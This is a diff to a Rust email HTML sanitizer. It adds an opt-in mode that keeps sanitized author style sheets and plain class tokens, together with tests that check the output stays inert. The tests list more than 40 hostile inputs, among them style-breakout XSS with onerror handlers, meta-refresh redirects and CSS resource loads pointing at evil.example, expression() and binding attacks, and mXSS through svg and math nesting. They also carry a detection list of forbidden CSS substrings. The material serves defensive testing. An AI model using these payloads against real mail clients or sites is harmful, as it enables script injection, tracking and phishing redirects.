@@ -4,6 +4,10 @@
 //! property; links open in a new browsing context without opener or
 //! referrer; every resource URL is rewritten: `cid:` to a signed part URL,
 //! remote images to a signed proxy URL or a blocked placeholder.
+//!
+//! With author CSS on (`--render-author-css`, B1), the body's `<style>`
+//! sheets come back as one sanitized `<style>` ([`super::css`]) and `class`
+//! attributes are kept when their tokens are plain names.
 
 use std::borrow::Cow;
 use std::collections::{HashMap, HashSet};
@@ -95,7 +99,7 @@ const TAGS: &[&str] = &[
 ];
 
 /// Removed together with their content.
-const DROP_WITH_CONTENT: &[&str] = &[
+pub(super) const DROP_WITH_CONTENT: &[&str] = &[
     "applet", "audio", "embed", "frame", "frameset", "head", "iframe", "math", "noembed",
     "noframes", "noscript", "object", "script", "select", "style", "svg", "template", "textarea",
     "title", "video", "xmp",
@@ -134,7 +138,7 @@ const TAG_ATTRIBUTES: &[(&str, &[&str])] = &[
 
 /// CSS properties kept in `style` attributes; positioning is left out so a
 /// message cannot overlay its own frame.
-const STYLE_PROPERTIES: &[&str] = &[
+pub(super) const STYLE_PROPERTIES: &[&str] = &[
     "background",
     "background-color",
     "border",
@@ -204,7 +208,7 @@ const STYLE_PROPERTIES: &[&str] = &[
 /// Substrings that drop a whole CSS declaration (checked lowercased with
 /// whitespace removed); backslashes are refused outright since CSS escapes
 /// can spell any of them.
-const CSS_FORBIDDEN: &[&str] = &[
+pub(super) const CSS_FORBIDDEN: &[&str] = &[
     "url(",
     "image(",
     "image-set(",
@@ -331,6 +335,25 @@ pub fn filter_style(value: &str) -> Option<String> {
     (!kept.is_empty()).then(|| kept.join(";"))
 }
 
+/// `class` tokens kept with author CSS: at most this many, each a plain
+/// name of [`MAX_CLASS_LEN`] bytes at most.
+const MAX_CLASSES: usize = 32;
+const MAX_CLASS_LEN: usize = 64;
+
+/// A `class` value whose tokens are all `[A-Za-z0-9_-]{1,64}`, at most
+/// [`MAX_CLASSES`] of them, with whitespace normalized; anything else drops
+/// the attribute.
+pub fn filter_class(value: &str) -> Option<String> {
+    let tokens: Vec<&str> = value.split_ascii_whitespace().collect();
+    let plain = |t: &&str| {
+        t.len() <= MAX_CLASS_LEN
+            && t.bytes()
+                .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
+    };
+    (!tokens.is_empty() && tokens.len() <= MAX_CLASSES && tokens.iter().all(plain))
+        .then(|| tokens.join(" "))
+}
+
 struct Filter {
     links: Links,
     remote_images: Arc<AtomicU32>,
@@ -359,6 +382,8 @@ impl Filter {
     fn apply<'v>(&self, element: &str, attribute: &str, value: &'v str) -> Option<Cow<'v, str>> {
         match (element, attribute) {
             (_, "style") => filter_style(value).map(Cow::Owned),
+            // Only reaches here with author CSS on: `class` is allowed then.
+            (_, "class") => filter_class(value).map(Cow::Owned),
             ("img", "src") | (_, "background") => self.image(value).map(Cow::Owned),
             ("a", "href") => {
                 let url = value.trim();
@@ -378,8 +403,9 @@ fn own_url(url: &str) -> Option<Cow<'_, str>> {
 }
 
 /// Sanitizes an HTML body (a full document or a fragment) into a body
-/// fragment.
-pub fn sanitize(html: &str, links: Links) -> (String, Stats) {
+/// fragment. With `author_css`, the sanitized author sheets lead the
+/// fragment as one `<style>` and plain `class` attributes are kept.
+pub fn sanitize(html: &str, links: Links, author_css: bool) -> (String, Stats) {
     let remote_images = Arc::new(AtomicU32::new(0));
     let filter = Filter {
         links,
@@ -389,10 +415,17 @@ pub fn sanitize(html: &str, links: Links) -> (String, Stats) {
         .iter()
         .map(|(tag, attrs)| (*tag, attrs.iter().copied().collect()))
         .collect();
-    let out = Builder::empty()
+    let mut generic_attributes: HashSet<&str> = GENERIC_ATTRIBUTES.iter().copied().collect();
+    if author_css {
+        generic_attributes.insert("class");
+    }
+    // `style` stays in `DROP_WITH_CONTENT`: ammonia removes every original
+    // sheet, and only the re-serialized one below is emitted.
+    let sheet = author_css.then(|| super::css::author_css(html)).flatten();
+    let cleaned = Builder::empty()
         .tags(TAGS.iter().copied().collect())
         .clean_content_tags(DROP_WITH_CONTENT.iter().copied().collect())
-        .generic_attributes(GENERIC_ATTRIBUTES.iter().copied().collect())
+        .generic_attributes(generic_attributes)
         .tag_attributes(tag_attributes)
         .url_schemes(["http", "https", "mailto", "cid", "data"].into())
         .url_relative(UrlRelative::Custom(Box::new(own_url)))
@@ -403,6 +436,10 @@ pub fn sanitize(html: &str, links: Links) -> (String, Stats) {
         .attribute_filter(move |element, attribute, value| filter.apply(element, attribute, value))
         .clean(html)
         .to_string();
+    let out = match sheet {
+        Some(css) => format!("<style>{css}</style>{cleaned}"),
+        None => cleaned,
+    };
     let stats = Stats {
         remote_images: remote_images.load(Ordering::Relaxed),
     };
@@ -430,7 +467,7 @@ mod tests {
     }
 
     fn clean(html: &str) -> String {
-        sanitize(html, blocked()).0
+        sanitize(html, blocked(), false).0
     }
 
     /// Fails on anything that could run script, load a resource from
@@ -573,7 +610,9 @@ mod tests {
             assert_inert(input, &clean(input));
             assert_inert(
                 input,
-                &sanitize(input, proxied()).0.replace("/api/proxy/img/", ""),
+                &sanitize(input, proxied(), false)
+                    .0
+                    .replace("/api/proxy/img/", ""),
             );
         }
     }
@@ -595,12 +634,12 @@ mod tests {
     fn remote_images_are_blocked_or_proxied() {
         let html = "<img src=\"https://ok.example/a.png\" alt=a>\
                     <table><tr><td background=\"http://ok.example/b.png\">x</td></tr></table>";
-        let (out, stats) = sanitize(html, blocked());
+        let (out, stats) = sanitize(html, blocked(), false);
         assert_eq!(stats.remote_images, 2);
         assert_eq!(out.matches(BLOCKED_IMAGE).count(), 2, "{out}");
         assert!(!out.contains("ok.example"));
 
-        let (out, stats) = sanitize(html, proxied());
+        let (out, stats) = sanitize(html, proxied(), false);
         assert_eq!(stats.remote_images, 2);
         assert!(out.contains("src=\"/api/proxy/img/24\""), "{out}");
         assert!(out.contains("background=\"/api/proxy/img/23\""), "{out}");
@@ -631,10 +670,306 @@ mod tests {
 
     #[test]
     fn documents_lose_head_and_keep_body() {
-        let out = clean(
-            "<html><head><title>T</title><style>p{}</style></head><body><p>Hello</p></body></html>",
+        let doc =
+            "<html><head><title>T</title><style>p{}</style></head><body><p>Hello</p></body></html>";
+        assert_eq!(clean(doc), "<p>Hello</p>");
+        assert_eq!(styled(doc), "<p>Hello</p>", "an empty sheet is not emitted");
+        let doc = "<html><head><title>T</title><style>p{color:red}</style></head>\
+                   <body><p class=\"x\">Hello</p></body></html>";
+        assert_eq!(clean(doc), "<p>Hello</p>");
+        assert_eq!(
+            styled(doc),
+            "<style>p{color:red}</style><p class=\"x\">Hello</p>"
         );
-        assert_eq!(out, "<p>Hello</p>");
+    }
+
+    fn styled(html: &str) -> String {
+        sanitize(html, blocked(), true).0
+    }
+
+    /// The sheet a sanitized fragment leads with, and the rest.
+    fn split_sheet(out: &str) -> (Option<&str>, &str) {
+        match out.strip_prefix("<style>") {
+            Some(rest) => {
+                let end = rest.find("</style>").expect("closed sheet");
+                (Some(&rest[..end]), &rest[end + "</style>".len()..])
+            }
+            None => (None, out),
+        }
+    }
+
+    /// Fails on a kept sheet that could load anything, escape its element
+    /// or redress the frame, and on anything [`assert_inert`] rejects in
+    /// the markup around it.
+    fn assert_inert_css(input: &str, out: &str) {
+        let (sheet, rest) = split_sheet(out);
+        if let Some(sheet) = sheet {
+            assert!(!sheet.is_empty(), "empty sheet for {input:?}");
+            let squashed: String = sheet
+                .chars()
+                .filter(|c| !c.is_whitespace())
+                .collect::<String>()
+                .to_ascii_lowercase();
+            for needle in [
+                "<",
+                ">\"",
+                "-->",
+                "\\",
+                "url(",
+                "src(",
+                "image(",
+                "image-set(",
+                "cross-fade(",
+                "element(",
+                "paint(",
+                "expression(",
+                "var(",
+                "env(",
+                "attr(",
+                "@import",
+                "@font-face",
+                "@namespace",
+                "@supports",
+                "behavior",
+                "-moz-binding",
+                "javascript:",
+                "position",
+                "content:",
+                ":has(",
+                "http",
+                "evil.example",
+                "refresh",
+            ] {
+                assert!(
+                    !squashed.contains(needle),
+                    "{needle} survived in the sheet of {input:?}: {out}"
+                );
+            }
+        }
+        assert_inert(input, rest);
+    }
+
+    /// Hostile author CSS (AC18), rendered with author CSS on.
+    const CSS_XSS: &[&str] = &[
+        // `</style>` inside strings, comments, selectors and URLs ends the
+        // element at the HTML level; what follows must be sanitized markup.
+        "<style>p{font-family:\"</style><img src=x onerror=alert(1)>\"}</style>",
+        "<style>/*</style><img src=x onerror=alert(1)>*/p{color:red}</style>",
+        "<style>p[title=\"</style><img src=x onerror=alert(1)>\"]{color:red}</style>",
+        "<style>p{background:url(\"</style><img src=x onerror=alert(1)>\")}</style>",
+        "<style>p{color:red}</StYlE><img src=x onerror=alert(1)></style>",
+        // Meta refresh through a font name: CSP does not stop navigation.
+        "<style>p{font-family:\"x</style><meta http-equiv=refresh content=0;url=https://evil.example>\"}</style>",
+        "<style>p{font-family:'\\3c/style\\3e\\3cmeta http-equiv=refresh content=0;url=https://evil.example\\3e'}</style>",
+        "<style>p{font-family:\"<meta http-equiv=refresh>\"}</style>",
+        "<style>p{font-family:\"a\\\nb\"}</style>",
+        "<style><!--p{color:red}--></style>",
+        "<style>p{font-family:\"<!--\"}p{font-family:\"-->\"}</style>",
+        // Resource loads.
+        "<style>@import 'https://evil.example/x.css';</style>",
+        "<style>@import url(https://evil.example/x.css);p{color:red}</style>",
+        "<style>@\\69mport 'https://evil.example/x.css';</style>",
+        "<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}p{font-family:x}</style>",
+        "<style>@namespace url(https://evil.example/ns);</style>",
+        "<style>p{background:url(https://evil.example/x)}</style>",
+        "<style>p{background-image:URL( 'https://evil.example/x' )}</style>",
+        "<style>p{background:u\\72l(https://evil.example/x)}</style>",
+        "<style>p{background:url/**/('https://evil.example/x')}</style>",
+        "<style>p{background:image-set('https://evil.example/x' 1x)}</style>",
+        "<style>p{background:-webkit-image-set('https://evil.example/x' 1x)}</style>",
+        "<style>p{background:image('https://evil.example/x')}</style>",
+        "<style>p{background:cross-fade(url(https://evil.example/a),url(https://evil.example/b))}</style>",
+        "<style>p{background:src('https://evil.example/x')}</style>",
+        "<style>input[value^=a]{background:url(https://evil.example/a)}</style>",
+        // Script and bindings.
+        "<style>p{width:expression(alert(1))}</style>",
+        "<style>p{behavior:url(x.htc)}</style>",
+        "<style>p{-moz-binding:url(https://evil.example/x.xml#x)}</style>",
+        "<style>p{background:javascript:alert(1)}</style>",
+        // Substitution and unknown functions.
+        "<style>p{--u:url(https://evil.example/x);background:var(--u)}</style>",
+        "<style>p{width:env(safe-area-inset-left)}</style>",
+        "<style>p{width:attr(data-w px)}</style>",
+        "<style>p{color:evil(1)}</style>",
+        // Redressing.
+        "<style>div{position:fixed;top:0;left:0;width:100%}</style>",
+        "<style>p::before{content:'Your session expired'}</style>",
+        // Escapes in selectors, names and values.
+        "<style>.\\3c script{color:red}</style>",
+        "<style>p{c\\olor:red}</style>",
+        "<style>p{color:r\\65 d}</style>",
+        // Selector side channels.
+        "<style>body:has(a[href^='https://bank.example']) p{display:none}</style>",
+        "<style>a:visited{color:red}</style>",
+        // Oversized and over-nested sheets.
+        "<style>@media screen{@media screen{@media screen{p{color:red}}}}</style>",
+        // SVG, MathML and template sheets are not author CSS (mXSS).
+        "<svg><style>p{color:red}</style></svg>",
+        "<svg><foreignObject><style>p{color:red}</style></foreignObject></svg>",
+        "<math><style>p{color:red}</style></math>",
+        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
+        "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
+        "<math><annotation-xml encoding=\"text/html\"><style>p{color:red}</style></annotation-xml></math>",
+        "<template><style>p{color:red}</style></template>",
+        "<noscript><style>p{color:red}</style></noscript>",
+        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
+    ];
+
+    #[test]
+    fn hostile_author_css_is_neutralized() {
+        assert!(CSS_XSS.len() >= 40);
+        for input in CSS_XSS.iter().chain(XSS) {
+            assert_inert_css(input, &styled(input));
+            assert_inert_css(
+                input,
+                &sanitize(input, proxied(), true)
+                    .0
+                    .replace("/api/proxy/img/", ""),
+            );
+        }
+        for input in [
+            "<svg><style>p{color:red}</style></svg>",
+            "<svg><foreignObject><style>p{color:red}</style></foreignObject></svg>",
+            "<math><style>p{color:red}</style></math>",
+            "<template><style>p{color:red}</style></template>",
+            "<math><mtext><table><mglyph><style>p{color:red}</style>",
+        ] {
+            assert_eq!(split_sheet(&styled(input)).0, None, "{input}");
+        }
+        // `</p>` breaks out of foreign content, for browsers and ammonia
+        // alike: this sheet is an HTML one.
+        assert_eq!(
+            split_sheet(&styled("<svg></p><style>p{color:red}</style>")).0,
+            Some("p{color:red}")
+        );
+    }
+
+    #[test]
+    fn hostile_sheets_keep_their_safe_rules_only() {
+        assert_eq!(
+            split_sheet(&styled(
+                "<style>@import url(https://evil.example/x.css);p{color:red}</style>"
+            ))
+            .0,
+            Some("p{color:red}")
+        );
+        assert_eq!(
+            split_sheet(&styled("<style><!--p{color:red}--></style>")).0,
+            Some("p{color:red}")
+        );
+        assert_eq!(
+            split_sheet(&styled(
+                "<style>p{color:red;background:url(https://evil.example/x);width:1px}</style>"
+            ))
+            .0,
+            Some("p{color:red;width:1px}")
+        );
+        assert_eq!(
+            split_sheet(&styled("<style>a[href^=\"https\"]{color:red}</style>")).0,
+            Some("a[href^=\"https\"]{color:red}"),
+            "attribute selectors stay for layout fidelity"
+        );
+    }
+
+    #[test]
+    fn oversized_sheets_are_dropped_whole() {
+        let many = format!("<style>{}</style><p>x</p>", "p{color:red}".repeat(2001));
+        assert_eq!(styled(&many), "<p>x</p>");
+        let big = format!(
+            "<style>p{{color:red}}</style><style>q{{font-family:\"{}\"}}</style><p>x</p>",
+            "a".repeat(128 * 1024)
+        );
+        assert_eq!(styled(&big), "<p>x</p>");
+        let deep = format!("<style>{}</style><p>x</p>", "{".repeat(50_000));
+        assert_eq!(styled(&deep), "<p>x</p>");
+    }
+
+    #[test]
+    fn class_is_kept_only_with_author_css_and_plain_tokens() {
+        let html = "<p class=\" a  b-c\td_E9 \">x</p>";
+        assert_eq!(clean(html), "<p>x</p>");
+        assert_eq!(styled(html), "<p class=\"a b-c d_E9\">x</p>");
+        for bad in [
+            "<p class=\"a&quot;b\">x</p>",
+            "<p class=\"a b:c\">x</p>",
+            "<p class=\"a\u{e9}\">x</p>",
+            "<p class=\"\">x</p>",
+            "<p class=\"a/b\">x</p>",
+        ] {
+            assert_eq!(styled(bad), "<p>x</p>", "{bad}");
+        }
+        let long = format!("<p class=\"{}\">x</p>", "a".repeat(65));
+        assert_eq!(styled(&long), "<p>x</p>");
+        let ok = format!("<p class=\"{}\">x</p>", "a".repeat(64));
+        assert_eq!(styled(&ok), ok);
+        let many: Vec<String> = (0..33).map(|i| format!("c{i}")).collect();
+        assert_eq!(
+            styled(&format!("<p class=\"{}\">x</p>", many.join(" "))),
+            "<p>x</p>"
+        );
+        let enough = format!("<p class=\"{}\">x</p>", many[..32].join(" "));
+        assert_eq!(styled(&enough), enough);
+        assert_eq!(
+            styled("<p id=\"x\" class=\"y\">x</p>"),
+            "<p class=\"y\">x</p>",
+            "id stays stripped"
+        );
+    }
+
+    /// A stripped Mailchimp-style template: class-based columns that stack
+    /// on phones.
+    #[test]
+    fn class_based_responsive_templates_survive() {
+        let html = concat!(
+            "<!doctype html><html><head>",
+            "<meta name=\"viewport\" content=\"width=device-width\">",
+            "<style type=\"text/css\">",
+            "body,#bodyTable{height:100% !important;margin:0;padding:0;width:100% !important}",
+            ".mcnTextContent{word-break:break-word;font-size:16px;line-height:150%}",
+            ".mcnTextContent a{color:#007C89;font-weight:normal;text-decoration:underline}",
+            "table.templateContainer{max-width:600px !important;border:0}",
+            "@media only screen and (min-width:768px){.templateContainer{width:600px !important}}",
+            "@media only screen and (max-width: 480px){",
+            "  body{-webkit-text-size-adjust:none !important}",
+            "  .col{display:block!important;width:100%!important}",
+            "  .mcnTextContent,.mcnTextContent p{font-size:16px !important;line-height:150% !important}",
+            "  img.mcnImage{width:100% !important;height:auto !important}",
+            "}",
+            "@media (prefers-color-scheme:dark){body{background:#000 !important}}",
+            "</style></head><body>",
+            "<table class=\"templateContainer\" width=\"600\"><tr>",
+            "<td class=\"col mcnTextContent\" width=\"300\"><p>Left</p></td>",
+            "<td class=\"col mcnTextContent\" width=\"300\"><p>Right</p></td>",
+            "</tr></table></body></html>"
+        );
+        let out = styled(html);
+        let (sheet, rest) = split_sheet(&out);
+        assert_eq!(
+            sheet,
+            Some(concat!(
+                "body,#bodyTable{height:100% !important;margin:0;padding:0;width:100% !important}",
+                ".mcnTextContent{word-break:break-word;font-size:16px;line-height:150%}",
+                ".mcnTextContent a{color:#007C89;font-weight:normal;text-decoration:underline}",
+                "table.templateContainer{max-width:600px !important;border:0}",
+                "@media only screen and (min-width:768px){.templateContainer{width:600px !important}}",
+                "@media only screen and (max-width:480px){",
+                ".col{display:block!important;width:100%!important}",
+                ".mcnTextContent,.mcnTextContent p{font-size:16px !important;line-height:150% !important}",
+                "img.mcnImage{width:100% !important;height:auto !important}",
+                "}"
+            ))
+        );
+        assert_eq!(
+            rest.matches("class=\"col mcnTextContent\"").count(),
+            2,
+            "{rest}"
+        );
+        assert!(
+            rest.contains("<table class=\"templateContainer\" width=\"600\">"),
+            "{rest}"
+        );
+        assert_inert_css(html, &out);
     }
 
     #[test]
